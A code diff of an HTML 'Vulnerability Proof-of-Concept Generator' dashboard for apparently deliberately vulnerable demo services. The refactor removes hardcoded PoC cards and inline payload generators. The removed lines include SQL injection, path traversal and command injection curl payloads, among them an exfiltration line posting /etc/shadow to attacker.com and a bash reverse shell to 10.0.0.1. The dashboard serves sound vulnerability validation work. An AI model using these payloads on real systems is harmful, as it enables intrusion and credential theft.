@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vulnerability Proof-of-Concept Generator - Contrast Security</title>
+    <title>Vulnerability Proof-of-Concept Generator - MVC</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
     <style>
@@ -40,12 +40,39 @@
             margin-bottom: 10px;
         }
 
+        #loading {
+            display: none;
+            text-align: center;
+            padding: 40px;
+            font-size: 1.5em;
+        }
+
+        #error-message {
+            display: none;
+            background: rgba(255,68,68,0.2);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border: 2px solid rgba(255,68,68,0.5);
+        }
+
+        #vulnerabilities-container {
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+
         .vuln-card {
             background: rgba(255, 255, 255, 0.05);
             border-radius: 15px;
             padding: 30px;
-            margin-bottom: 30px;
             border: 2px solid rgba(102, 126, 234, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .vuln-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.4);
         }
 
         .vuln-header {
@@ -55,11 +82,6 @@
             margin-bottom: 20px;
             flex-wrap: wrap;
             gap: 15px;
-        }
-
-        .vuln-title {
-            flex: 1;
-            min-width: 300px;
         }
 
         .vuln-title h2 {
@@ -74,22 +96,31 @@
             font-size: 0.9em;
         }
 
-        .severity-badge {
+        .severity-critical {
+            background: #ff4444;
+            color: #fff;
             padding: 8px 20px;
             border-radius: 8px;
             font-weight: bold;
             text-transform: uppercase;
-            font-size: 0.9em;
-        }
-
-        .severity-critical {
-            background: #ff4444;
-            color: #fff;
         }
 
         .severity-high {
             background: #ff8800;
             color: #fff;
+            padding: 8px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .severity-medium {
+            background: #ffaa00;
+            color: #fff;
+            padding: 8px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            text-transform: uppercase;
         }
 
         .vuln-meta {
@@ -125,11 +156,19 @@
             border-bottom: 2px solid rgba(102, 126, 234, 0.3);
         }
 
+        .code-section {
+            margin: 20px 0;
+        }
+
+        .code-section h4 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+
         .code-block {
             background: #282c34;
             border-radius: 8px;
             padding: 20px;
-            margin: 15px 0;
             overflow-x: auto;
             border: 1px solid rgba(102, 126, 234, 0.3);
         }
@@ -149,866 +188,122 @@
 
         .exploit-request {
             background: #1a1d26;
-            border-left: 4px solid #ff4444;
+            border-left: 4px solid #ff6b6b;
         }
 
-        .poc-steps {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
+        .recommendation {
+            background: rgba(102, 234, 144, 0.1);
             padding: 20px;
-            margin: 20px 0;
-        }
-
-        .step {
-            display: flex;
-            align-items: flex-start;
-            margin: 15px 0;
-            padding: 15px;
-            background: rgba(102, 126, 234, 0.1);
             border-radius: 8px;
+            border-left: 4px solid #66ea90;
+            margin-top: 20px;
         }
 
-        .step-number {
-            background: #667eea;
-            color: #fff;
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            flex-shrink: 0;
-            margin-right: 15px;
+        .recommendation h4 {
+            color: #66ea90;
+            margin-bottom: 10px;
         }
 
-        .step-content {
-            flex: 1;
-        }
-
-        .step-content h4 {
-            color: #667eea;
-            margin-bottom: 8px;
-        }
-
-        .curl-command {
-            background: #1a1d26;
-            padding: 15px;
-            border-radius: 8px;
-            border-left: 4px solid #00ff88;
-            margin: 10px 0;
-            overflow-x: auto;
-        }
-
-        .curl-command code {
-            color: #00ff88;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9em;
-        }
-
-        .alert {
-            padding: 15px 20px;
-            border-radius: 8px;
-            margin: 15px 0;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .alert-warning {
-            background: rgba(255, 136, 0, 0.2);
-            border-left: 4px solid #ff8800;
-        }
-
-        .alert-danger {
-            background: rgba(255, 68, 68, 0.2);
-            border-left: 4px solid #ff4444;
-        }
-
-        .alert-icon {
-            font-size: 1.5em;
-        }
-
-        .stacktrace {
-            max-height: 400px;
-            overflow-y: auto;
-        }
-
-        .stack-frame {
-            padding: 8px 12px;
-            margin: 5px 0;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 5px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.85em;
-        }
-
-        .stack-frame:hover {
-            background: rgba(102, 126, 234, 0.1);
-        }
-
-        .vulnerable-frame {
-            background: rgba(255, 68, 68, 0.2);
-            border-left: 3px solid #ff4444;
-        }
-
-        .back-link {
-            display: inline-block;
-            margin-top: 30px;
-            padding: 12px 30px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: #fff;
-            text-decoration: none;
-            border-radius: 8px;
-            font-weight: bold;
-            transition: all 0.3s ease;
-        }
-
-        .back-link:hover {
-            transform: scale(1.05);
-            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
-        }
-
-        .tabs {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .tab {
-            padding: 12px 24px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px solid rgba(102, 126, 234, 0.3);
-            border-radius: 8px 8px 0 0;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .tab.active {
-            background: rgba(102, 126, 234, 0.2);
-            border-bottom-color: transparent;
-        }
-
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
+        .no-vulnerabilities,
+        .no-poc {
+            text-align: center;
+            padding: 40px;
+            color: #9ca3af;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>🔬 Vulnerability Proof-of-Concept Generator</h1>
-            <p>Validate and demonstrate security vulnerabilities with generated exploit requests</p>
+            <h1>🔒 Vulnerability Proof-of-Concept Generator</h1>
+            <p>Generate exploitable PoCs for discovered vulnerabilities</p>
         </header>
 
-        <!-- SQL Injection PoC -->
-        <div class="vuln-card">
-            <div class="vuln-header">
-                <div class="vuln-title">
-                    <h2>SQL Injection from "creditCard", "shipmentId" Parameters</h2>
-                    <div class="vuln-id">VULN-ID: SALY-Y689-EXC0-CQLC</div>
-                </div>
-                <div class="severity-badge severity-critical">Critical</div>
-            </div>
-
-            <div class="vuln-meta">
-                <div class="meta-item">
-                    <div class="meta-label">Application</div>
-                    <div class="meta-value">cargo-cats-dataservice</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Route</div>
-                    <div class="meta-value">/payments</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Method</div>
-                    <div class="meta-value">GET</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Environment</div>
-                    <div class="meta-value">DEVELOPMENT</div>
-                </div>
-            </div>
-
-            <div class="alert alert-danger">
-                <div class="alert-icon">⚠️</div>
-                <div>
-                    <strong>Security Risk:</strong> This SQL injection vulnerability allows an attacker to manipulate database queries,
-                    potentially exposing sensitive data, modifying records, or executing administrative operations.
-                </div>
-            </div>
-
-            <h3 class="section-title">📋 Proof-of-Concept Steps</h3>
-            <div class="poc-steps">
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <div class="step-content">
-                        <h4>Identify Vulnerable Parameters</h4>
-                        <p>The vulnerability exists in the <code>creditCard</code> and <code>shipmentId</code> query parameters on the <code>/payments</code> endpoint.</p>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div class="step-content">
-                        <h4>Review Original Request</h4>
-                        <p>The original HTTP request that triggered the vulnerability detection:</p>
-                        <div class="code-block http-request">
-                            <pre>GET /payments?creditCard=contrast-redacted-financial-info&shipmentId=1 HTTP/1.1
-Accept: application/json
-Connection: keep-alive
-Host: dataservice:8080
-User-Agent: Java/11.0.29</pre>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div class="step-content">
-                        <h4>Generate Exploit Request</h4>
-                        <p>Craft a SQL injection payload to demonstrate the vulnerability:</p>
-                        <div class="curl-command">
-                            <code>curl -X GET "http://dataservice:8080/payments?creditCard=1234' OR '1'='1&shipmentId=1' UNION SELECT password FROM users--" \
-  -H "Accept: application/json" \
-  -H "User-Agent: PoC-Generator"</code>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">4</div>
-                    <div class="step-content">
-                        <h4>Validate Exploitation</h4>
-                        <p>Execute the request and examine the response. A successful SQL injection would return:</p>
-                        <ul style="margin-top: 10px; margin-left: 20px;">
-                            <li>Unauthorized data from the database</li>
-                            <li>Database error messages revealing schema information</li>
-                            <li>Modified application behavior indicating query manipulation</li>
-                        </ul>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">5</div>
-                    <div class="step-content">
-                        <h4>Document Findings</h4>
-                        <p>Record the full HTTP request and response to provide evidence of the vulnerability to the development team.</p>
-                    </div>
-                </div>
-            </div>
-
-            <h3 class="section-title">🎯 Alternative Exploitation Techniques</h3>
-            <div class="tabs">
-                <div class="tab active" onclick="switchTab(event, 'boolean-sql')">Boolean-Based Blind</div>
-                <div class="tab" onclick="switchTab(event, 'union-sql')">UNION-Based</div>
-                <div class="tab" onclick="switchTab(event, 'time-sql')">Time-Based Blind</div>
-            </div>
-
-            <div class="tab-content active" id="boolean-sql">
-                <div class="curl-command">
-                    <code># Test for true condition
-curl "http://dataservice:8080/payments?creditCard=1234' AND '1'='1&shipmentId=1" -s | wc -c
-
-# Test for false condition
-curl "http://dataservice:8080/payments?creditCard=1234' AND '1'='2&shipmentId=1" -s | wc -c
-
-# Different response sizes indicate SQL injection vulnerability</code>
-                </div>
-            </div>
-
-            <div class="tab-content" id="union-sql">
-                <div class="curl-command">
-                    <code># Extract database version
-curl "http://dataservice:8080/payments?creditCard=1234' UNION SELECT @@version--&shipmentId=1"
-
-# Extract table names
-curl "http://dataservice:8080/payments?creditCard=1234' UNION SELECT table_name FROM information_schema.tables--&shipmentId=1"</code>
-                </div>
-            </div>
-
-            <div class="tab-content" id="time-sql">
-                <div class="curl-command">
-                    <code># Time-based detection
-curl "http://dataservice:8080/payments?creditCard=1234' AND SLEEP(5)--&shipmentId=1" -w "Time: %{time_total}s\n"
-
-# Response time > 5 seconds indicates vulnerability</code>
-                </div>
-            </div>
-
-            <h3 class="section-title">🔍 Vulnerable Code Location</h3>
-            <div class="alert alert-warning">
-                <div class="alert-icon">⚡</div>
-                <div>
-                    <strong>Vulnerable File:</strong> PaymentController.java:55 in executeRawQuery() method
-                </div>
-            </div>
-
-            <div class="code-block stacktrace">
-                <div class="stack-frame vulnerable-frame">com.contrast.dataservice.PaymentController.executeRawQuery(PaymentController.java:55)</div>
-                <div class="stack-frame">org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:444)</div>
-                <div class="stack-frame">org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:393)</div>
-                <div class="stack-frame">org.springframework.jdbc.core.JdbcTemplate$1ExecuteStatementCallback.doInStatement(JdbcTemplate.java:435)</div>
-                <div class="stack-frame">com.zaxxer.hikari.pool.HikariProxyStatement.execute()</div>
-            </div>
+        <div id="loading" style="display:none;">
+            <p>Loading vulnerabilities and generating PoCs...</p>
         </div>
 
-        <!-- Command Injection PoC -->
-        <div class="vuln-card">
-            <div class="vuln-header">
-                <div class="vuln-title">
-                    <h2>OS Command Injection from Request Body</h2>
-                    <div class="vuln-id">VULN-ID: DXF8-3N0U-UGTV-R74V</div>
-                </div>
-                <div class="severity-badge severity-high">High</div>
-            </div>
+        <div id="error-message" style="display:none;"></div>
 
-            <div class="vuln-meta">
-                <div class="meta-item">
-                    <div class="meta-label">Application</div>
-                    <div class="meta-value">cargo-cats-webhookservice</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Route</div>
-                    <div class="meta-value">/testConnection</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Method</div>
-                    <div class="meta-value">POST</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Language</div>
-                    <div class="meta-value">Python</div>
-                </div>
-            </div>
-
-            <div class="alert alert-danger">
-                <div class="alert-icon">💥</div>
-                <div>
-                    <strong>Security Risk:</strong> OS Command Injection allows attackers to execute arbitrary system commands,
-                    potentially leading to complete system compromise, data theft, or service disruption.
-                </div>
-            </div>
-
-            <h3 class="section-title">📋 Proof-of-Concept Steps</h3>
-            <div class="poc-steps">
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <div class="step-content">
-                        <h4>Original Request Pattern</h4>
-                        <div class="code-block http-request">
-                            <pre>POST /testConnection HTTP/1.1
-Accept: application/json
-Host: webhookservice:5000
-Content-Type: application/json
-Content-Length: 30
-
-contrast-redacted-body</pre>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div class="step-content">
-                        <h4>Command Injection Payload</h4>
-                        <p>Inject OS commands through the request body parameter:</p>
-                        <div class="curl-command">
-                            <code>curl -X POST "http://webhookservice:5000/testConnection" \
-  -H "Content-Type: application/json" \
-  -H "Accept: application/json" \
-  -d '{"url": "https://example.com; cat /etc/passwd"}'</code>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div class="step-content">
-                        <h4>Advanced Exploitation</h4>
-                        <p>Chain multiple commands to demonstrate full system access:</p>
-                        <div class="curl-command">
-                            <code># Exfiltrate sensitive data
-curl -X POST "http://webhookservice:5000/testConnection" \
-  -H "Content-Type: application/json" \
-  -d '{"url": "https://example.com; curl -X POST https://attacker.com/steal -d @/etc/shadow"}'
-
-# Reverse shell payload
-curl -X POST "http://webhookservice:5000/testConnection" \
-  -H "Content-Type: application/json" \
-  -d '{"url": "https://example.com; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}'</code>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <h3 class="section-title">🔍 Vulnerable Code Location</h3>
-            <div class="alert alert-warning">
-                <div class="alert-icon">⚡</div>
-                <div>
-                    <strong>Vulnerable File:</strong> app.py:284 in test_connection() method
-                </div>
-            </div>
-
-            <div class="code-block stacktrace">
-                <div class="stack-frame vulnerable-frame">app.py, line 284, in test_connection()</div>
-                <div class="stack-frame">subprocess.py, line 505, in run()</div>
-                <div class="stack-frame">flask.app.py, line 1469, in dispatch_request()</div>
-                <div class="stack-frame">flask.app.py, line 1484, in full_dispatch_request()</div>
-            </div>
-        </div>
-
-        <!-- Path Traversal PoC -->
-        <div class="vuln-card">
-            <div class="vuln-header">
-                <div class="vuln-title">
-                    <h2>Path Traversal from "path" Parameter</h2>
-                    <div class="vuln-id">VULN-ID: 3VQ2-N6XF-GS7K-MCKF</div>
-                </div>
-                <div class="severity-badge severity-high">High</div>
-            </div>
-
-            <div class="vuln-meta">
-                <div class="meta-item">
-                    <div class="meta-label">Application</div>
-                    <div class="meta-value">cargo-cats-imageservice</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Route</div>
-                    <div class="meta-value">/getphoto</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Method</div>
-                    <div class="meta-value">GET</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Language</div>
-                    <div class="meta-value">C# / .NET</div>
-                </div>
-            </div>
-
-            <div class="alert alert-danger">
-                <div class="alert-icon">📁</div>
-                <div>
-                    <strong>Security Risk:</strong> Path Traversal vulnerabilities allow attackers to access files outside the intended directory,
-                    potentially exposing configuration files, credentials, or application source code.
-                </div>
-            </div>
-
-            <h3 class="section-title">📋 Proof-of-Concept Steps</h3>
-            <div class="poc-steps">
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <div class="step-content">
-                        <h4>Baseline Request</h4>
-                        <div class="code-block http-request">
-                            <pre>GET /getphoto?path=cat.jpg HTTP/1.1
-Host: imageservice
-Accept: application/octet-stream, application/json
-User-Agent: Java/11.0.29</pre>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div class="step-content">
-                        <h4>Directory Traversal Exploits</h4>
-                        <div class="curl-command">
-                            <code># Access /etc/passwd (Linux)
-curl "http://imageservice/getphoto?path=../../../../etc/passwd"
-
-# Access web.config (Windows)
-curl "http://imageservice/getphoto?path=..\\..\\..\\..\\web.config"
-
-# Access application secrets
-curl "http://imageservice/getphoto?path=../../appsettings.json"</code>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div class="step-content">
-                        <h4>Encoding Bypass Techniques</h4>
-                        <div class="curl-command">
-                            <code># URL encoding
-curl "http://imageservice/getphoto?path=..%2F..%2F..%2Fetc%2Fpasswd"
-
-# Double URL encoding
-curl "http://imageservice/getphoto?path=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
-
-# Unicode encoding
-curl "http://imageservice/getphoto?path=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"</code>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <h3 class="section-title">🔍 Vulnerable Code Location</h3>
-            <div class="alert alert-warning">
-                <div class="alert-icon">⚡</div>
-                <div>
-                    <strong>Vulnerable File:</strong> Program.cs:99 in file read operation
-                </div>
-            </div>
-
-            <div class="code-block stacktrace">
-                <div class="stack-frame vulnerable-frame">Program.&lt;&gt;c__DisplayClass0_0.&lt;&lt;Main&gt;$&gt;b__2(Program.cs:99)</div>
-                <div class="stack-frame">System.IO.File.ReadAllBytes()</div>
-                <div class="stack-frame">System.IO.File.OpenHandle()</div>
-                <div class="stack-frame">Microsoft.Win32.SafeHandles.SafeFileHandle.Open()</div>
-            </div>
-        </div>
-
-        <a href="index.html" class="back-link">← Back to Reports</a>
+        <div id="vulnerabilities-container"></div>
     </div>
 
-    <script>
-        // Configuration
-        const CONFIG = {
-            orgId: '545a3bce-97c5-4732-af38-1ac459087b0a',
-            applications: [
-                { appId: 'f1df5e87-5088-42a3-be76-5bdd4457cbb3', name: 'cargo-cats-frontgateservice' },
-                { appId: 'bd4637f1-9976-4036-ad33-b2275417d141', name: 'cargo-cats-dataservice' },
-                { appId: 'e6035803-486c-4976-8b53-3cf307ba8cc1', name: 'cargo-cats-webhookservice' },
-                { appId: '84e7660a-5b4c-4770-951d-f9abf023a8c8', name: 'cargo-cats-imageservice' },
-                { appId: '9b762b48-fc24-4ab1-9847-124475fbd2f1', name: 'cargo-cats-labelservice' }
-            ]
-        };
+    <!-- MVC JavaScript -->
+    <script type="module">
+        // Import MVC classes and ConfigLoader
+        import { ConfigLoader } from './src/utils/ConfigLoader.js';
+        import { PocGeneratorModel } from './src/models/PocGeneratorModel.js';
+        import { PocGeneratorController } from './src/controllers/PocGeneratorController.js';
+        import { PocGeneratorView } from './src/views/PocGeneratorView.js';
 
-        // Fetch vulnerabilities
-        async function fetchVulnerabilities() {
+        // Load credentials from .creds file
+        await ConfigLoader.init();
+
+        // Initialize MVC
+        const model = new PocGeneratorModel();
+        const controller = new PocGeneratorController();
+        const view = new PocGeneratorView();
+
+        // Main application logic
+        async function loadDashboard() {
             try {
-                const response = await fetch(`/api/contrast/api/ng/${CONFIG.orgId}/orgtraces/filter?severities=CRITICAL,HIGH&expand=skip_links&limit=10`, {
-                    headers: { 'Accept': 'application/json' }
+                view.showLoading();
+                view.hideError();
+
+                // Fetch vulnerabilities with details (Model)
+                const vulns = await model.fetchVulnerabilitiesWithDetails({
+                    severities: ['CRITICAL', 'HIGH'],
+                    limit: 10
                 });
 
-                if (!response.ok) {
-                    console.error('Failed to fetch vulnerabilities');
-                    return [];
+                if (vulns.length === 0) {
+                    view.hideLoading();
+                    view.showError('No critical or high vulnerabilities found');
+                    return;
                 }
 
-                const result = await response.json();
-                return result.traces || [];
-            } catch (error) {
-                console.error('Error fetching vulnerabilities:', error);
-                return [];
-            }
-        }
+                // Transform data (Controller)
+                const enrichedVulns = vulns.map(vuln => {
+                    const enriched = controller.enrichVulnerability(vuln);
+                    const pocCode = controller.extractPocCode(vuln);
 
-        // Fetch detailed vulnerability info
-        async function fetchVulnDetails(vulnId, appId) {
-            try {
-                const response = await fetch(`/api/contrast/api/ng/${CONFIG.orgId}/traces/${appId}/trace/${vulnId}?expand=skip_links,card,request`, {
-                    headers: { 'Accept': 'application/json' }
+                    // Generate curl command if HTTP request available
+                    if (pocCode.httpRequest) {
+                        pocCode.curlCommand = controller.generateCurlCommand(
+                            pocCode.httpRequest,
+                            'https://example.com'
+                        );
+                    }
+
+                    return {
+                        ...enriched,
+                        pocCode
+                    };
                 });
 
-                if (!response.ok) return null;
+                // Sort by severity (Controller)
+                const sortedVulns = controller.sortBySeverity(enrichedVulns);
 
-                const result = await response.json();
-                return result.trace;
+                // Render (View)
+                view.renderVulnerabilities(sortedVulns);
+
+                view.hideLoading();
+
+                // Highlight code blocks
+                document.querySelectorAll('pre code').forEach((block) => {
+                    hljs.highlightElement(block);
+                });
+
+                console.log(`Loaded ${sortedVulns.length} vulnerabilities with PoCs`);
             } catch (error) {
-                console.error(`Error fetching details for ${vulnId}:`, error);
-                return null;
+                view.hideLoading();
+                view.showError(`Failed to load dashboard: ${error.message}`);
+                console.error('Dashboard error:', error);
             }
         }
 
-        // Generate POC card HTML
-        function generatePOCCard(vuln) {
-            const severityClass = vuln.severity.toLowerCase();
-            const route = vuln.request?.uri || 'Unknown';
-            const method = vuln.request?.method || 'GET';
-            const httpRequest = vuln.request?.rawRequest || 'Request details not available';
-
-            // Extract parameters from title
-            const paramMatch = vuln.title.match(/from (.*?) (Parameter|on)/i);
-            const parameters = paramMatch ? paramMatch[1] : 'Request';
-
-            // Generate exploitation payloads based on vuln type
-            let exploitPayloads = '';
-            let alternativeTechniques = '';
-
-            if (vuln.rule_name === 'sql-injection') {
-                exploitPayloads = generateSQLInjectionPayloads(route, parameters);
-                alternativeTechniques = generateSQLAlternatives(route);
-            } else if (vuln.rule_name === 'cmd-injection') {
-                exploitPayloads = generateCmdInjectionPayloads(route, parameters);
-                alternativeTechniques = '';
-            } else if (vuln.rule_name === 'path-traversal') {
-                exploitPayloads = generatePathTraversalPayloads(route, parameters);
-                alternativeTechniques = '';
-            }
-
-            // Get vulnerable line from stack trace
-            const vulnLine = vuln.events && vuln.events.length > 0 ?
-                vuln.events.find(e => e.type === 'CREATION' || e.type === 'P2O')?.stacktrace?.[0] || 'Unknown' : 'Unknown';
-
-            // Generate stack trace HTML
-            const stackTraceHTML = (vuln.events && vuln.events.length > 0) ?
-                vuln.events[0].stacktrace?.slice(0, 10).map((frame, idx) => `
-                    <div class="stack-frame ${idx === 0 ? 'vulnerable-frame' : ''}">
-                        ${frame}
-                    </div>
-                `).join('') : '<div class="stack-frame">Stack trace not available</div>';
-
-            return `
-                <div class="vuln-card">
-                    <div class="vuln-header">
-                        <div class="vuln-title">
-                            <h2>${vuln.title}</h2>
-                            <div class="vuln-id">VULN-ID: ${vuln.uuid}</div>
-                        </div>
-                        <div class="severity-badge severity-${severityClass}">${vuln.severity}</div>
-                    </div>
-
-                    <div class="vuln-meta">
-                        <div class="meta-item">
-                            <div class="meta-label">Application</div>
-                            <div class="meta-value">${vuln.application.name.replace('cargo-cats-contrast-', '')}</div>
-                        </div>
-                        <div class="meta-item">
-                            <div class="meta-label">Route</div>
-                            <div class="meta-value">${route}</div>
-                        </div>
-                        <div class="meta-item">
-                            <div class="meta-label">Method</div>
-                            <div class="meta-value">${method}</div>
-                        </div>
-                        <div class="meta-item">
-                            <div class="meta-label">Environment</div>
-                            <div class="meta-value">DEVELOPMENT</div>
-                        </div>
-                    </div>
-
-                    <div class="alert alert-danger">
-                        <div class="alert-icon">⚠️</div>
-                        <div>
-                            <strong>Security Risk:</strong> ${getRiskDescription(vuln.rule_name)}
-                        </div>
-                    </div>
-
-                    <h3 class="section-title">📋 Proof-of-Concept Steps</h3>
-                    <div class="poc-steps">
-                        <div class="step">
-                            <div class="step-number">1</div>
-                            <div class="step-content">
-                                <h4>Identify Vulnerable Parameters</h4>
-                                <p>The vulnerability exists in the <code>${parameters}</code> parameter(s) on the <code>${route}</code> endpoint.</p>
-                            </div>
-                        </div>
-
-                        <div class="step">
-                            <div class="step-number">2</div>
-                            <div class="step-content">
-                                <h4>Review Original Request</h4>
-                                <p>The original HTTP request that triggered the vulnerability detection:</p>
-                                <div class="code-block http-request">
-                                    <pre>${escapeHtml(httpRequest)}</pre>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="step">
-                            <div class="step-number">3</div>
-                            <div class="step-content">
-                                <h4>Generate Exploit Request</h4>
-                                <p>Craft an exploitation payload to demonstrate the vulnerability:</p>
-                                ${exploitPayloads}
-                            </div>
-                        </div>
-
-                        <div class="step">
-                            <div class="step-number">4</div>
-                            <div class="step-content">
-                                <h4>Validate Exploitation</h4>
-                                <p>Execute the request and examine the response for signs of successful exploitation.</p>
-                            </div>
-                        </div>
-
-                        <div class="step">
-                            <div class="step-number">5</div>
-                            <div class="step-content">
-                                <h4>Document Findings</h4>
-                                <p>Record the full HTTP request and response to provide evidence of the vulnerability to the development team.</p>
-                            </div>
-                        </div>
-                    </div>
-
-                    ${alternativeTechniques}
-
-                    <h3 class="section-title">🔍 Vulnerable Code Location</h3>
-                    <div class="alert alert-warning">
-                        <div class="alert-icon">⚡</div>
-                        <div>
-                            <strong>Vulnerable Location:</strong> ${vulnLine}
-                        </div>
-                    </div>
-
-                    <div class="code-block stacktrace">
-                        ${stackTraceHTML}
-                    </div>
-
-                    <h3 class="section-title">🛠️ Automated Fixes</h3>
-                    <div class="alert alert-warning">
-                        <div class="alert-icon">🚧</div>
-                        <div>
-                            <strong>Status:</strong> Fixes to be provided soon
-                        </div>
-                    </div>
-                </div>
-            `;
-        }
-
-        // Helper functions
-        function getRiskDescription(ruleType) {
-            const risks = {
-                'sql-injection': 'SQL injection allows attackers to manipulate database queries, potentially exposing sensitive data, modifying records, or executing administrative operations.',
-                'cmd-injection': 'OS Command Injection allows attackers to execute arbitrary system commands, potentially leading to complete system compromise, data theft, or service disruption.',
-                'path-traversal': 'Path Traversal vulnerabilities allow attackers to access files outside the intended directory, potentially exposing configuration files, credentials, or application source code.',
-                'xss-reflected': 'Cross-Site Scripting (XSS) allows attackers to inject malicious scripts that execute in victim browsers, potentially stealing credentials, session tokens, or sensitive data.',
-                'xxe': 'XML External Entity (XXE) attacks can expose local files, internal network resources, or cause denial of service.'
-            };
-            return risks[ruleType] || 'This vulnerability poses a significant security risk to the application.';
-        }
-
-        function generateSQLInjectionPayloads(route, params) {
-            return `
-                <div class="curl-command">
-                    <code>curl -X GET "${route}?${params.replace(/"/g, '')}=1234' OR '1'='1" \\
-  -H "Accept: application/json" \\
-  -H "User-Agent: PoC-Generator"</code>
-                </div>
-            `;
-        }
-
-        function generateSQLAlternatives(route) {
-            return `
-                <h3 class="section-title">🎯 Alternative Exploitation Techniques</h3>
-                <div class="tabs">
-                    <div class="tab active" onclick="switchTab(event, 'boolean-sql-${route}')">Boolean-Based Blind</div>
-                    <div class="tab" onclick="switchTab(event, 'union-sql-${route}')">UNION-Based</div>
-                    <div class="tab" onclick="switchTab(event, 'time-sql-${route}')">Time-Based Blind</div>
-                </div>
-
-                <div class="tab-content active" id="boolean-sql-${route}">
-                    <div class="curl-command">
-                        <code># Test for true condition
-curl "${route}?param=1234' AND '1'='1" -s | wc -c
-
-# Test for false condition
-curl "${route}?param=1234' AND '1'='2" -s | wc -c</code>
-                    </div>
-                </div>
-
-                <div class="tab-content" id="union-sql-${route}">
-                    <div class="curl-command">
-                        <code># Extract database version
-curl "${route}?param=1234' UNION SELECT @@version--"</code>
-                    </div>
-                </div>
-
-                <div class="tab-content" id="time-sql-${route}">
-                    <div class="curl-command">
-                        <code># Time-based detection
-curl "${route}?param=1234' AND SLEEP(5)--" -w "Time: %{time_total}s\n"</code>
-                    </div>
-                </div>
-            `;
-        }
-
-        function generateCmdInjectionPayloads(route, params) {
-            return `
-                <div class="curl-command">
-                    <code>curl -X POST "${route}" \\
-  -H "Content-Type: application/json" \\
-  -H "Accept: application/json" \\
-  -d '{"url": "https://example.com; cat /etc/passwd"}'</code>
-                </div>
-            `;
-        }
-
-        function generatePathTraversalPayloads(route, params) {
-            return `
-                <div class="curl-command">
-                    <code># Access /etc/passwd (Linux)
-curl "${route}?${params.replace(/"/g, '')}=../../../../etc/passwd"
-
-# Access web.config (Windows)
-curl "${route}?${params.replace(/"/g, '')}=..\\\\..\\\\..\\\\..\\\\web.config"</code>
-                </div>
-            `;
-        }
-
-        function escapeHtml(text) {
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
-
-        function switchTab(event, tabId) {
-            // Remove active class from all tabs and contents
-            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
-
-            // Add active class to clicked tab and corresponding content
-            event.target.classList.add('active');
-            const targetContent = document.getElementById(tabId);
-            if (targetContent) targetContent.classList.add('active');
-        }
-
-        // Update page with real vulnerability data
-        async function updatePage() {
-            const vulns = await fetchVulnerabilities();
-
-            if (vulns.length === 0) {
-                console.log('No vulnerabilities available - showing static data');
-                return;
-            }
-
-            // Fetch detailed info for first 3 critical/high vulns
-            const detailedVulns = [];
-            for (let i = 0; i < Math.min(3, vulns.length); i++) {
-                const details = await fetchVulnDetails(vulns[i].uuid, vulns[i].application.app_id);
-                if (details) {
-                    detailedVulns.push(details);
